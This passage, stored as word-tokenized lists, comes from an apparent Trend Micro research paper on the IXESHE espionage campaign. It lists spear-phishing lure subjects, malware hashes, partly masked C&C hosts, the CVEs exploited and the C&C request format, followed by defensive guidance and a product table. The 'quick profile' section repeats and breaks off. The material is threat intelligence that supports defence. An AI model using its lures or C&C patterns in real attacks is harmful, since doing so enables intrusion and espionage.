["\u65e5\u671f\u8868"], ["\u2022", "MD5:", "d4b98bda9c3ae0810a61f95863f4f81e"], ["\u2022", "C&C:", "xxxxx", ".", "compreautos.com.br"], ["\u2022", "Info:", "http://contagiodump", ".", "blogspot.com/2010/06/"], ["may-10-cve-2009-3129-xls-schedule-of", ".", "html"], ["\u2022", "Campaign", "code:", "CRML_0505"], ["\u2022", "8", "June", "2010"], ["\u2022", "XLS", "name/Subject", "hook:", "\u5929\u5b89\u8266\u5f8c\u7684\u671d\u9bae\u534a\u5cf6\u65b0"], ["\u5c40\u52e2"], ["\u2022", "MD5:", "100cf902ac31766f7d8a521eeb6f8d68"], ["\u2022", "C&C:", "xxx", ".", "xx.187.130"], ["\u2022", "Info:", "http://contagiodump", ".", "blogspot.com/2010/06/"], ["jun-8-cve-2009-4324-korean-peninsula", ".", "html"], ["\u2022", "Campaign", "code:", "MAIL0524"], ["\u2022", "27", "June", "2010"], ["\u2022", "PDF", "name/Subject", "hook:", "Discussion", "on", "CrossStrait", "Maritime", "Cooperation"], ["\u2022", "MD5:", "6e14c7a424c2eef7f37810ff65650837"], ["\u2022", "C&C:", "xxx", ".", "xx.128.71"], ["\u2022", "Info:", "http://contagiodump", ".", "blogspot.com/2010/07/"], ["jun-27-cve-2009-0927-pdf-discussion-on", ".", "html"], ["\u2022", "Campaign", "code:", "ML0628"], ["\u2022", "1", "July", "2010"], ["\u2022", "PDF", "name/Subject", "hook:", "\u7b2c\u4e94\u6b21\u6c5f\u9673\u6703\u8ac7\u6210\u679c\u8a18\u8005"], ["\u6703\u672c\u6703\u8cf4\u4e3b\u59d4\u8b1b\u8a71\u7a3f"], ["\u2022", "MD5:", "949265ee1d3e587152a23311a85b3be9"], ["\u2022", "C&C:", "xxx", ".", "xx.128.71"], ["\u2022", "Info:", "http://contagiodump", ".", "blogspot.com/2010/07/"], ["jul-01-cve-2009-4324-results-of-press", ".", "html"], ["\u2022", "Campaign", "code:", "ML0628"], ["PAGE", "13", "|", "IXESHE"], ["\u2022", "28", "July", "2010"], ["\u2022", "PDF", "name/Subject", "hook:", "Summary", "of", "Network"], ["Intelligence"], ["\u2022", "MD5:", "738af108a6edd46536492b1782589a04"], ["\u2022", "C&C:", "xxx", ".", "xx6.54.189"], ["\u2022", "Info:", "http://contagiodump", ".", "blogspot.com/2010/08/"], ["jul-28-cve-2009-4324-pdf-990729-romance", ".", "html"], ["\u2022", "Campaign", "code:", "[0713]"], ["\u2022", "16", "August", "2010"], ["\u2022", "PDF", "name/Subject", "hook:", "Communist", "China"], ["Removes", "Missiles"], ["\u2022", "MD5:", "6227e1594775773a182e1b631db5f6bb"], ["\u2022", "C&C:", "xxxxxck", ".", "dnsrd.com", "or", "xxx", ".", "xx6.34.94", "(appears"], ["to", "be", "a", "compromised", "computer", "of", "an", "East", "Asian"], ["university)"], ["\u2022", "Info:", "http://contagiodump", ".", "blogspot.com/2010/08/"], ["cve-2009-4324-cve-2010-1297-communist", ".", "html"], ["\u2022", "Campaign", "code:", "[0802]"], ["\u2022", "17", "August", "2010"], ["\u2022", "PDF", "name/Subject", "hook:", "[Unknown]"], ["\u2022", "MD5:", "36ee61663fc41496642850c4293fed01"], ["\u2022", "C&C:", "xxxxxck", ".", "dnsrd.com", "or", "xxx", ".", "xx6.34.94", "(appears"], ["to", "be", "a", "compromised", "computer", "of", "an", "East", "Asian"], ["university)"], ["\u2022", "Info:", "http://www", ".", "threatexpert.com/report.aspx?md"], ["5=36ee61663fc41496642850c4293fed01"], ["\u2022", "Campaign", "code:", "[0802]"], ["\u2022", "27", "September", "2010"], ["\u2022", "PDF", "name/Subject", "hook:", "[Unknown]"], ["\u2022", "MD5:", "313158192d4442013f7bedeb9def01ec"], ["\u2022", "C&C:", "xx", ".", "xx.x3.102"], ["\u2022", "Info:", "http://www", ".", "threatexpert.com/report.aspx?md"], ["5=313158192d4442013f7bedeb9def01ec"], ["\u2022", "Campaign", "code:", "[WH0827]"], ["\u2022", "22", "February", "2011"], ["\u2022", "PDF", "name/Subject", "hook:", "[Unknown]"], ["\u2022", "MD5:", "cd0eb6634ea684313389ddce553a6130"], ["\u2022", "C&C:", "xxx", ".", "xx.228.58"], ["\u2022", "Info:", "http://xml", ".", "ssdsandbox.net/view/"], ["cd0eb6634ea684313389ddce553a6130"], ["\u2022", "Campaign", "code:", "[0222]"], ["\u2022", "17", "March", "2011"], ["\u2022", "XLS", "name/Subject", "hook:", "Japan", "Nuclear", "Radiation"], ["Leakage", "and", "Vulnerability", "Analysis"], ["\u2022", "MD5:", "7ca4ab177f480503653702b33366111f"], ["\u2022", "C&C:", "xx", ".", "xxx.114.44"], ["\u2022", "Info:", "http://contagiodump", ".", "blogspot.com/2011/03/"], ["cve-2011-0609-adobe-flash-player", ".", "html"], ["\u2022", "Campaign", "code:", "OM222"], ["\u2022", "10", "April", "2011"], ["\u2022", "PDF", "name/Subject", "hook:", "[Unknown]"], ["\u2022", "MD5:", "711542d883f8fca4aeac62ee1b7df6ca"], ["\u2022", "C&C:", "xx", ".", "xx.x0.244"], ["\u2022", "Info:", "http://www", ".", "threatexpert.com/report.aspx?md"], ["5=711542d883f8fca4aeac62ee1b7df6ca"], ["\u2022", "Campaign", "code:", "[LY0406]"], ["\u2022", "20", "April", "2011"], ["\u2022", "PDF", "name/Subject", "hook:", "China\u2019s", "Charm"], ["Diplomacy", "in", "BRICS", "Summit"], ["\u2022", "MD5:", "ae39b747e4fe72dce6e5cdc6d0314c02"], ["\u2022", "C&C:", "xx", ".", "xx.x9.165"], ["\u2022", "Info:", "http://contagiodump", ".", "blogspot.com/2011/04/"], ["apr-20-cve-2011-0611-pdf-swf-chinas", ".", "html"], ["\u2022", "Campaign", "code:", "[Removed", "due", "to", "privacy"], ["concerns]"], ["\u2022", "20", "April", "2011"], ["\u2022", "PDF", "name/Subject", "hook:", "The", "Obama"], ["Administration", "and", "the", "Middle", "East"], ["\u2022", "MD5:", "2368a8f55ee78d844896f05f94866b07"], ["\u2022", "C&C:", "xx", ".", "xx.x9.165"], ["\u2022", "Info:", "http://contagiodump", ".", "blogspot.com/2011/04/"], ["apr-20-cve-2011-0611-pdf-swf-chinas", ".", "html"], ["\u2022", "Campaign", "code:", "{Removed", "due", "to", "privacy"], ["concerns]"], ["\u2022", "20", "April", "2011"], ["\u2022", "PDF", "name/Subject", "hook:", "Russia\u2019s", "profit", "from"], ["general", "NATO", "disunity"], ["\u2022", "MD5:", "4065b98fdcb17a081759061306239c8b"], ["\u2022", "C&C:", "xx", ".", "xx.x9.165"], ["\u2022", "Info:", "http://contagiodump", ".", "blogspot.com/2011/04/"], ["apr-20-cve-2011-0611-pdf-swf-chinas", ".", "html"], ["\u2022", "Campaign", "code:", "[Removed", "due", "to", "privacy"], ["concerns]"], ["\u2022", "22", "April", "2011"], ["\u2022", "PDF", "name/Subject", "hook:", "Marshall", "Plan", "for", "the"], ["North", "Africa"], ["\u2022", "MD5:", "6d5fb801b890bfa7cc737c018e87e456"], ["\u2022", "C&C:", "xx", ".", "xx.x9.165"], ["\u2022", "Info:", "http://contagiodump", ".", "blogspot.com/2011/04/"], ["apr-22-cve-2011-0611-pdf-swf-marshall", ".", "html"], ["\u2022", "Campaign", "code:", "[Removed", "due", "to", "privacy"], ["concerns]"], ["PAGE", "14", "|", "IXESHE"], ["\u2022", "28", "April", "2011"], ["\u2022", "PDF", "name/Subject", "hook:", "[Unknown]"], ["\u2022", "MD5:", "14bf72167b4e801da205ecf9c0c55f9b"], ["\u2022", "C&C:", "xx", ".", "xx.x33.2"], ["\u2022", "Info:", "http://xml", ".", "ssdsandbox.net/view/14bf72167b4e"], ["801da205ecf9c0c55f9b"], ["\u2022", "Campaign", "code:", "[LY0420]"], ["\u2022", "1", "June", "2011"], ["\u2022", "PDF", "name/Subject", "hook:", "[Unknown]"], ["\u2022", "MD5:", "6ee4e08e6ab51208757fdc41d0e72846"], ["\u2022", "C&C:", "xxxxxain", ".", "qpoe.com"], ["\u2022", "Info:", "http://www", ".", "threatexpert.com/report.aspx?md"], ["5=6ee4e08e6ab51208757fdc41d0e72846"], ["\u2022", "Campaign", "code:", "[LY]MAIL_20090923"], ["\u2022", "9", "June", "2011"], ["\u2022", "PDF", "name/Subject", "hook:", "[Unknown]"], ["\u2022", "MD5:", "10f193f825ada183fcfd067434ca269e"], ["\u2022", "C&C:", "xxxxxfo", ".", "AtHerSite.com"], ["\u2022", "Info:", "http://www", ".", "threatexpert.com/report.aspx?md"], ["5=10f193f825ada183fcfd067434ca269e"], ["\u2022", "Campaign", "code:", "[LY]MAIL_20091208"], ["\u2022", "21", "September", "2011"], ["\u2022", "PDF", "name/Subject", "hook:", "[Unknown]"], ["\u2022", "MD5:", "32522cdc17a145486e26f35bdd524e7e"], ["\u2022", "C&C:", "xxx", ".", "xx0.139.67"], ["\u2022", "Info:", "http://www", ".", "threatexpert.com/report.aspx?md"], ["5=32522cdc17a145486e26f35bdd524e7e"], ["\u2022", "Campaign", "code:", "[LY0816]"], ["\u2022", "12", "October", "2011"], ["\u2022", "PDF", "name/Subject", "hook:", "[Unknown]"], ["\u2022", "MD5:", "8718ab5c1683a69c4e6092fdcb32cfa2"], ["\u2022", "C&C:", "xxx", ".", "xx0.63.1"], ["\u2022", "Info:", "http://www", ".", "malware-control.com/statics-page"], ["s/8718ab5c1683a69c4e6092fdcb32cfa2", ".", "php"], ["\u2022", "Campaign", "code:", "[CZ0921]"], ["\u2022", "19", "October", "2011"], ["\u2022", "PDF", "name/Subject", "hook:", "[Unknown]"], ["\u2022", "MD5:", "80dad66d6224d18babd9ada4a26aee75"], ["\u2022", "C&C:", "xx", ".", "xxx.21.41", "or", "king", ".", "pirat3.com"], ["\u2022", "Info:", "http://xml", ".", "ssdsandbox.net/view/80dad66d62"], ["24d18babd9ada4a26aee75"], ["\u2022", "Campaign", "code:", "[WZ1011]"], ["\u2022", "26", "October", "2011"], ["\u2022", "PDF", "name/Subject", "hook:", "The", "Future", "Redefined"], ["2011", "AOEC", "CEO", "Summit"], ["\u2022", "MD5:", "3d91d9df315ffeb9bb1c774452b3114b"], ["\u2022", "C&C:", "xxx", ".", "xxawan.com", "or", "xxx", ".", "xx4.230.120"], ["\u2022", "Info:", "http://www", ".", "kahusecurity.com/2011/apecspearphish-2/"], ["\u2022", "Campaign", "code:", "19"], ["\u2022", "3", "November", "2011"], ["\u2022", "PDF", "name/Subject", "hook:", "[Unknown]"], ["\u2022", "MD5:", "E25DBA0556124D7874D8416DE291CFE2"], ["\u2022", "C&C:", "xxxxxfo", ".", "sdti.tw", "or", "xxx", ".", "xx2.246.110"], ["\u2022", "Info:", "http://www", ".", "threatexpert.com/report.aspx?md"], ["5=e25dba0556124d7874d8416de291cfe2"], ["\u2022", "Campaign", "code:", "[CR1031]"], ["\u2022", "15", "November", "2011"], ["\u2022", "PDF", "name/Subject", "hook:", "[Unknown]"], ["\u2022", "MD5:", "829b78f1d1e74c2c5343a0aebb51f519"], ["\u2022", "C&C:", "xxxxxaga", ".", "chickenkiller.com"], ["\u2022", "Info:", "http://www", ".", "threatexpert.com/report.aspx?md"], ["5=829b78f1d1e74c2c5343a0aebb51f519"], ["\u2022", "Campaign", "code:", "[TL1109]"], ["\u2022", "22", "November", "2011"], ["\u2022", "PDF", "name/Subject", "hook:", "[Unknown]"], ["\u2022", "MD5:", "c4a05230a898d91b30c88d52b3f069b3"], ["\u2022", "C&C:", "xxx", ".", "xx6.54.150", "or", "xxxxx", ".", "ItemDB.com"], ["\u2022", "Info:", "http://www", ".", "threatexpert.com/report.aspx?md"], ["5=c4a05230a898d91b30c88d52b3f069b3"], ["\u2022", "Campaign", "code:", "[WH1122]"], ["PAGE", "15", "|", "IXESHE"], ["CONCLUSION"], ["The", "IXESHE", "campaign", "has", "been", "successfully", "executing"], ["targeted", "attacks", "since", "2009", ".", "The", "attackers", "primarily"], ["use", "malicious", "", ".", "PDF", "files", "that", "exploit", "vulnerabilities", "in"], ["Adobe", "Reader", ",", "Acrobat", ",", "and", "Flash", "Player", ",", "including", "the"], ["use", "of", "two", "zero-day", "exploits\u2014one", "in", "2009", "and", "another"], ["in", "2011", ".", "While", "the", "attackers", "primarily", "targeted", "East"], ["Asian", "governments", "in", "the", "past", ",", "they", "have", "also", "started"], ["targeting", "a", "telecommunications", "company", "and", "electronics"], ["manufacturers", ".", "They", "kept", "track", "of", "their", "targeted", "attacks"], ["by", "embedding", "a", "\u201ccampaign", "tag\u201d", "in", "the", "malware", "that"], ["appears", "to", "describe", "when", "each", "attack", "was", "launched", "and", ","], ["in", "some", "cases", ",", "the", "nature", "of", "its", "target", ".", "We", "found", "more"], ["than", "40", "of", "these", "campaign", "tags", "."], ["The", "IXESHE", "attackers", "are", "notable", "for", "their", "use", "of"], ["compromised", "machines", "within", "a", "target\u2019s", "internal", "network"], ["as", "C&C", "servers", ".", "This", "helped", "disguise", "their", "activities", ".", "In"], ["addition", ",", "the", "attackers\u2019", "use", "of", "the", "proxy", "tool", ",", "HTran", ",", "also"], ["helped", "mask", "their", "true", "location", ".", "While", "their", "identities"], ["remain", "unknown", ",", "the", "attackers", "behind", "the", "IXESHE"], ["campaign", "demonstrated", "that", "they", "were", "both", "determined"], ["and", "capable", ".", "While", "the", "malware", "used", "in", "the", "attacks"], ["were", "not", "very", "complicated", "by", "nature", ",", "these", "proved", "very"], ["effective", ".", "This", "campaign", "remains", "an", "active", "threat", "."], ["DEFENDING", "AGAINST", "APTS"], ["Sufficiently", "motivated", "threat", "actors", "can", "penetrate"], ["even", "networks", "that", "use", "moderately", "advanced", "security"], ["measures", ".", "As", "such", ",", "apart", "from", "standard", "and", "relevant"], ["attack", "prevention", "measures", "and", "mechanisms", "such", "as"], ["solid", "patch", "management;", "endpoint", "and", "network", "security;"], ["firewall", "use;", "and", "the", "like", ",", "enterprises", "should", "also", "focus"], ["on", "detecting", "and", "mitigating", "attacks", ".", "Moreover", ",", "data"], ["loss", "prevention", "(DLP)", "strategies", "that", "identify", "the", "data"], ["an", "organization", "is", "protecting", "and", "take", "into", "account", "the"], ["context", "of", "data", "use", "should", "be", "employed", "."], ["Local", "and", "External", "Threat", "Intelligence"], ["Threat", "intelligence", "refers", "to", "indicators", "that", "can", "be", "used"], ["to", "identify", "the", "tools", ",", "tactics", ",", "and", "procedures", "threat", "actors"], ["engaging", "in", "targeted", "attacks", "utilize", ".", "Both", "external", "and"], ["local", "threat", "intelligence", "is", "crucial", "for", "developing", "the"], ["ability", "to", "detect", "attacks", "early", ".", "The", "following", "are", "the", "core"], ["components", "of", "this", "defense", "strategy:"], ["\u2022", "Enhanced", "visibility:", "Logs", "from", "endpoint", ",", "server", ","], ["and", "network", "monitoring", "are", "an", "important", "and", "often"], ["underused", "resource", "that", "can", "be", "aggregated", "to", "provide"], ["a", "view", "of", "the", "activities", "within", "an", "organization", "that"], ["can", "be", "processed", "for", "anomalous", "behaviors", "that", "can"], ["indicate", "a", "targeted", "attack", "."], ["\u2022", "Integrity", "checks:", "In", "order", "to", "maintain", "persistence", ","], ["malware", "will", "make", "modifications", "to", "the", "file", "system", "and"], ["registry", ".", "Monitoring", "such", "changes", "can", "indicate", "the"], ["presence", "of", "malware", "."], ["\u2022", "Empowering", "the", "human", "analyst:", "Humans", "are", "best"], ["positioned", "to", "identify", "anomalous", "behaviors", "when"], ["presented", "with", "a", "view", "of", "aggregated", "logs", "from", "across"], ["a", "network", ".", "This", "information", "is", "used", "in", "conjunction", "with"], ["custom", "alerts", "based", "on", "the", "local", "and", "external", "threat"], ["intelligence", "available", "."], ["Technologies", "available", "today", "such", "as", "Deep", "Discovery"], ["provide", "visibility", ",", "insight", ",", "and", "control", "over", "networks", "to"], ["defend", "against", "targeted", "threats", ".", "11", "Deep", "Discovery", "uniquely"], ["detects", "and", "identifies", "evasive", "threats", "in", "real", "time", "and"], ["provides", "in-depth", "analysis", "and", "actionable", "intelligence", "to"], ["prevent", ",", "discover", ",", "and", "reduce", "risks", "."], ["11", "http://www", ".", "trendmicro.com/us/enterprise/security-risk-management/"], ["deep-discovery/index", ".", "html"], ["PAGE", "16", "|", "IXESHE"], ["Mitigation", "and", "Cleanup", "Strategy"], ["Once", "an", "attack", "is", "identified", ",", "the", "cleanup", "strategy", "should"], ["focus", "on", "the", "following", "objectives:"], ["\u2022", "Determine", "the", "attack", "vector", "and", "cut", "off"], ["communications", "with", "the", "C&C", "server", "."], ["\u2022", "Determine", "the", "scope", "of", "the", "compromise", "."], ["\u2022", "Assess", "the", "damage", "by", "analyzing", "the", "data", "and", "forensic"], ["artifacts", "available", "on", "compromised", "machines", "."], ["Remediation", "should", "be", "applied", "soon", "afterward", ",", "which"], ["includes", "steps", "to", "fortify", "affected", "servers", ",", "machines", ",", "or"], ["devices", "into", "secure", "states", ",", "informed", "in", "part", "by", "how", "the"], ["compromised", "machines", "were", "infiltrated", "."], ["Educating", "Employees", "Against", "Social"], ["Engineering"], ["Security-related", "policies", "and", "procedures", "combined", "with"], ["education", "and", "training", "programs", "are", "essential", "components"], ["of", "defense", ".", "Traditional", "training", "methods", "can", "be", "fortified"], ["by", "simulations", "and", "exercises", "using", "real", "spear-phishing"], ["attempts", "sent", "to", "test", "employees", ".", "Employees", "trained", "to"], ["expect", "targeted", "attacks", "are", "better", "positioned", "to", "report"], ["potential", "threats", "and", "constitute", "an", "important", "source", "of"], ["threat", "intelligence", "."], ["Data-Centric", "Protection", "Strategy"], ["The", "ultimate", "objective", "of", "targeted", "attacks", "is", "to", "acquire"], ["sensitive", "data", ".", "As", "such", ",", "DLP", "strategies", "that", "focus", "on"], ["identifying", "and", "protecting", "confidential", "information", "are"], ["critical", ".", "Enhanced", "data", "protection", "and", "visibility", "across"], ["an", "enterprise", "provides", "the", "ability", "to", "control", "access", "to"], ["sensitive", "data", "as", "well", "as", "monitor", "and", "log", "successful", "and"], ["unsuccessful", "attempts", "to", "access", "it", ".", "Enhanced", "access"], ["control", "and", "logging", "capabilities", "allow", "security", "analysts", "to"], ["locate", "and", "investigate", "anomalies", ",", "respond", "to", "incidents", ",", "and"], ["initiate", "remediation", "strategies", "and", "damage", "assessment", "."], ["PAGE", "17", "|", "IXESHE"], ["TREND", "MICRO", "THREAT", "PROTECTION", "AGAINST", "IXESHE", "CAMPAIGN"], ["COMPONENTS"], ["The", "following", "table", "summarizes", "the", "Trend", "Micro", "solutions", "for", "the", "components", "of", "the", "IXESHE", "campaign", ".", "Trend", "Micro"], ["recommends", "a", "comprehensive", "security", "risk", "management", "strategy", "that", "goes", "further", "than", "advanced", "protection", "to", "meet"], ["the", "real-time", "threat", "management", "requirements", "of", "dealing", "with", "targeted", "attacks", "."], ["Attack", "Component", "Protection", "Technology", "Trend", "Micro", "Solution"], ["Predetermined", "C&C", "communication"], ["format:"], ["http://[C&C", "Server]/"], ["[ACD]", "[EW]S[Some", "Numbers]", "."], ["jsp", "?", "[Encrypted", "Base64", "Blob]"], ["Web", "Reputation", "Endpoint", "(Titanium", ",", "Worry-Free", "Business"], ["Security", ",", "OfficeScan)"], ["Server", "(Deep", "Security)"], ["Messaging", "(InterScan", "Messaging", "Security", ","], ["ScanMail", "Suite", "for", "Microsoft", "Exchange)"], ["Network", "(Deep", "Discovery)"], ["Gateway", "(InterScan", "Web", "Security", ","], ["InterScan", "Messaging", "Security)"], ["Mobile", "(Mobile", "Security)"], ["TROJ_PIDIEF", ",", "BKDR_PROXY", ",", "TROJ_"], ["DROPR", ",", "and", "TROJ_DEMTRANC", "variants"], ["File", "Reputation"], ["(Antivirus/Anti-malware)"], ["Endpoint", "(Titanium", ",", "Worry-Free", "Business"], ["Security", ",", "OfficeScan)"], ["Server", "(Deep", "Security)"], ["Messaging", "(InterScan", "Messaging", "Security", ","], ["ScanMail", "Suite", "for", "Microsoft", "Exchange)"], ["Network", "(Deep", "Discovery)"], ["Gateway", "(InterScan", "Web", "Security", ","], ["InterScan", "Messaging", "Security)"], ["Mobile", "(Mobile", "Security)"], ["CVE-2009-4324"], ["CVE-2009-0927"], ["CVE-2011-0609"], ["CVE-2011-0611"], ["CVE-2009-3129"], ["Vulnerability", "Shielding/Virtual", "Patching", "Server", "(Deep", "Security)"], ["Endpoint", "(OfficeScan", "with", "Intrusion"], ["Defense", "Firewall", "Plug-In)"], ["For", "CVE-2009-4324:"], ["\u2022", "Rule", "#1004008", "(Adobe", "Reader", "and"], ["Acrobat", "\u2018newplayer()\u2019", "JavaScript"], ["Method", "Code", "Execution)"], ["For", "CVE-2009-0927:"], ["\u2022", "Rule", "#", "1003405", "(Adobe", "Acrobat"], ["JavaScript", "getIcon", "Method", "Buffer"], ["Overflow)"], ["For", "CVE-2011-0609:"], ["\u2022", "Rule", "#1004615", "(Adobe", "Flash", "Player"], ["XLS", "Remote", "Code", "Execution)"], ["For", "CVE-2011-0611:"], ["\u2022", "Rule", "#", "1004647", "(Restrict", "Microsoft"], ["Office", "File", "with", "Embedded", "SWF)"], ["For", "CVE-2009-3129:"], ["\u2022", "Rule", "#1003817", "(Excel", "Featheader"], ["Record", "Memory", "Corruption"], ["Vulnerability)"], ["PAGE", "18", "|", "IXESHE"], ["Attack", "Component", "Protection", "Technology", "Trend", "Micro", "Solution"], ["xxx", ".", "x.x87.206"], ["xxx", ".", "xx2.36.5"], ["xxx", ".", "xx6.129.228"], ["xxx", ".", "xx0.139.67"], ["xxx", ".", "xx.39.184"], ["xx", ".", "xxx.12.18"], ["xxx", ".", "xxrver.us"], ["xxx", ".", "xxt-alice.de"], ["xxxxxbaby", ".", "mooo.com"], ["xxxxxlic", ".", "yahoobigdeals.com"], ["xx", ".", "xx.x1.252"], ["xxx", ".", "xx.228.58"], ["xxx", ".", "xx.183.86"], ["xxx", ".", "xx.128.71"], ["xxx", ".", "xx.13.148"], ["xxx", ".", "xx5.243.44"], ["xxx", ".", "xx2.216.5"], ["xxx", ".", "xx.151.190"], ["xxx", ".", "xx.63.113"], ["xxx", ".", "xx.58.110"], ["xxx", ".", "xx.111.151"], ["xxx", ".", "xx6.54.150"], ["xxx", ".", "xx4.230.120"], ["xxx", ".", "xx0.139.67"], ["xxx", ".", "xx2.246.110"], ["xx", ".", "xxx.223.3"], ["xx", ".", "xx.x3.102"], ["xx", ".", "xx.x9.165"], ["xx", ".", "xx.x0.244"], ["xx", ".", "xx.x33.2"], ["xxxxxa", ".", "2waky.com"], ["xxx", ".", "xxawan.com"], ["xxxxxmic", ".", "dyndns-wiki.com"], ["xxxxxain", ".", "qpoe.com"], ["xxx", ".", "xxrver.us"], ["xxxxxfo", ".", "AtHerSite.com"], ["xxxxxem", ".", "passingg.as"], ["xxx", ".", "xxset.com"], ["xxxxx", ".", "dnset.com"], ["xxxx", ".", "xirat3.com"], ["xxxxxaga", ".", "chickenkiller.com"], ["xxxxx", ".", "otzo.com"], ["xxxxxck", ".", "dnsrd.com"], ["xxxxx", ".", "portrelay.com"], ["xxxxx", ".", "FindHere.org"], ["Web", ",", "Domain", ",", "and", "IP", "Reputation", "Endpoint", "(Titanium", ",", "Worry-Free", "Business"], ["Security", ",", "OfficeScan)"], ["Server", "(Deep", "Security)"], ["Messaging", "(InterScan", "Messaging", "Security", ","], ["ScanMail", "Suite", "for", "Microsoft", "Exchange)"], ["Network", "(Deep", "Discovery)"], ["Gateway", "(InterScan", "Web", "Security", ","], ["InterScan", "Messaging", "Security)"], ["Mobile", "(Mobile", "Security)"], ["PAGE", "18", "|", "IXESHE"], ["May", "2012", "|", "APT", "Campaign", "Quick", "Profile:", "IXESHE"], ["Advanced", "persistent", "threats", "(APTs)", "refer", "to", "a", "category", "of", "threats", "that", "aggressively", "pursue", "and", "compromise", "specific"], ["targets", "to", "maintain", "persistent", "presence", "within", "the", "victim\u2019s", "network", "so", "they", "can", "move", "laterally", "and", "exfiltrate", "data", "."], ["Unlike", "indiscriminate", "cybercrime", "attacks", ",", "spam", ",", "web", "threats", ",", "and", "the", "like", ",", "APTs", "are", "much", "harder", "to", "detect", "because"], ["of", "the", "targeted", "nature", "of", "related", "components", "and", "techniques", ".", "Also", ",", "while", "cybercrime", "focuses", "on", "stealing", "credit", "card"], ["and", "banking", "information", "to", "gain", "profit", ",", "APTs", "are", "better", "thought", "of", "as", "cyber", "espionage", "."], ["IXESHE"], ["\u2022", "First", "Seen"], ["Individual", "targeted", "attacks", "are", "not", "one-off", "attempts", ".", "Attackers", "continually", "try", "to", "get", "inside", "the", "target\u2019s", "network", "."], ["The", "IXESHE", "campaign", "has", "been", "actively", "staging", "targeted", "attacks", "since", "at", "least", "July", "of", "2009", "."], ["\u2022", "Victims", "and", "Targets"], ["APT", "campaigns", "target", "specific", "industries", "or", "communities", "of", "interest", "in", "specific", "regions", "."], ["IXESHE", "has", "been", "found", "to", "target", "electronics", "manufacturers", ",", "a", "telecommunications", "company", ",", "and", "East", "Asian", "governments", "."], ["\u2022", "Operations"], ["First-stage", "computer", "intrusions", "often", "use", "social", "engineering", ".", "Attackers", "custom-fit", "attacks", "to", "their", "targets", "."], ["IXESHE", "attacks", "used", "custom-fit", "targeted", "emails", "with", "PDF", "exploits", "for", "CVE-2009-4324", ",", "CVE-2009-0927", ",", "CVE-2011-0609", ",", "and", "CVE-2011-0611", ".", "These"], ["were", "used", "to", "drop", "malicious", "executable", "files", "that", "gave", "the", "attackers", "complete", "control", "of", "their", "targets\u2019", "systems", "."], ["The", "attackers", "used", "either", "dynamic", "Domain", "Name", "System", "(DNS)", "or", "compromised", "servers", "hosted", "on", "networks", "that", "they", "previously", "successfully"], ["infiltrated", "."], ["\u2022", "Possible", "Indicators", "of", "Compromise"], ["Attackers", "want", "to", "remain", "undetected", "as", "long", "as", "possible", ".", "A", "key", "characteristic", "of", "these", "attacks", "is", "stealth", "."], ["\u00bb", "Enters", "networks", "via", "a", "specially", "crafted", ",", "targeted", "email", "with", "a", "malicious", "file", "attachment"], ["\u00bb", "Uses", "document", "exploits", "(primarily", "PDF", "exploits)", "to", "drop", "malware", "onto", "target", "systems"], ["\u00bb", "Uses", "malware", "detected", "as", "IXESHE", "by", "security", "companies"], ["\u00bb", "Sends", "a", "GET", "request", "to", "the", "command-and-control", "(C&C)", "server", "with", "the", "format:"], ["http://[C&C", "Server]/[ACD]", "[EW]S[Some", "Numbers]", ".", "jsp?[Encrypted", "Base64", "Blob]"], ["*", "The", "campaign", "codes", "we", "have", "seen", "so", "far", "are", "detailed", "in", "the", "Trend", "Micro", "research", "paper", ",", "\u201cIXESHE:", "An", "APT", "Campaign", ".", "\u201d", "The", "characteristics"], ["highlighted", "in", "this", "APT", "campaign", "quick", "profile", "reflect", "the", "results", "of", "our", "investigation", "as", "of", "May", "2012", "."], ["May", "2012", "|", "APT", "Campaign", "Quick", "Profile:", "IXESHE"], ["Advanced", "persistent", "threats", "(APTs)", "refer", "to", "a", "category", "of", "threats", "that", "aggressively", "pursue", "and", "compromise", "specific"], ["targets", "to", "maintain", "persistent", "presence", "within", "the", "victim\u2019s", "network", "so", "they", "can", "move", "laterally", "and", "exfiltrate", "data", "."], ["Unlike", "indiscriminate", "cybercrime", "attacks", ",", "spam", ",", "web", "threats", ",", "and", "the", "like", ",", "APTs", "are", "much", "harder", "to", "detect", "because"], ["of", "the", "targeted", "nature", "of", "related", "components", "and", "techniques", ".", "Also", ",", "while", "cybercrime", "focuses", "on", "stealing", "credit", "card"], ["and", "banking", "information", "to", "gain", "profit", ",", "APTs", "are", "better", "thought", "of", "as", "cyber", "espionage", "."], ["IXESHE"], ["\u2022", "First", "Seen"], ["Individual", "targeted", "attacks", "are", "not", "one-off", "attempts", ".", "Attackers", "continually", "try", "to", "get", "inside", "the", "target\u2019s", "network", "."], ["The", "IXESHE", "campaign", "has", "been", "actively", "staging", "targeted", "attacks", "since", "at", "least", "July", "of", "2009", "."], ["\u2022", "Victims", "and", "Targets"], ["APT", "campaigns", "target", "specific", "industries", "or", "communities", "of", "interest", "in", "specific", "regions", "."], ["IXESHE", "has", "been", "found", "to", "target", "electronics", "manufacturers", ",", "a", "German", "telecommunications", "company", ",", "and", "East", "Asian", "governments", "."], ["\u2022", "Operations"], ["First-stage", "computer", "intrusions", "often", "use", "social", "engineering", ".", "Attackers", "custom-fit", "attacks", "to", "their", "targets", "."], ["IXESHE", "attacks", "used", "custom-fit", "targeted", "emails", "with", "PDF", "exploits", "for", "CVE-2009-4324", ",", "CVE-2009-0927", ",", "CVE-2011-0609", ",", "and", "CVE-2011-0611", ".", "These"], ["were", "used", "to", "drop", "malicious", "executable", "files", "that", "gave", "the", "attackers", "complete", "control", "of", "their", "targets\u2019", "systems", "."], ["The", "attackers", "used", "either", "dynamic", "Domain", "Name", "System", "(DNS)", "or", "compromised", "servers", "hosted", "on", "networks", "that", "they", "previously", "successfully"], ["infiltrated", "."], ["\u2022", "Possible", "Indicators", "of", "Compromise"], ["Attackers", "want", "to", "remain", "undetected", "as", "long", "as", "possible", ".", "A", "key", "characteristic", "of", "these", "attacks", "is", "stealth", "."], ["\u00bb", "Enters", "networks", "via", "a", "specially", "crafted", ",", "targeted", "email", "with", "a", "malicious", "file", "attachment"], ["\u00bb", "Uses", "document", "exploits", "(primarily", "PDF", "exploits)", "to", "drop", "malware", "onto", "target", "systems"], ["\u00bb", "Uses", "malware", "detected", "as", "IXESHE", "by", "security", "companies"], ["\u00bb", "Sends", "a", "GET", "request", "to", "the", "command-and-control", "(C&C)", "server", "with", "the", "format:"], ["http://[C&C", "Server]/[ACD]", "[EW]S[Some", "Numbers]", ".", "jsp?[Encrypted", "Base64", "Blob]"], ["*", "The", "campaign", "codes", "we", "have", "seen", "so", "far", "are", "detailed", "in", "the", "Trend", "Micro", "research", "paper", ",", "\u201cIXESHE:", "An", "APT", "Campaign", ".", "\u201d", "The", 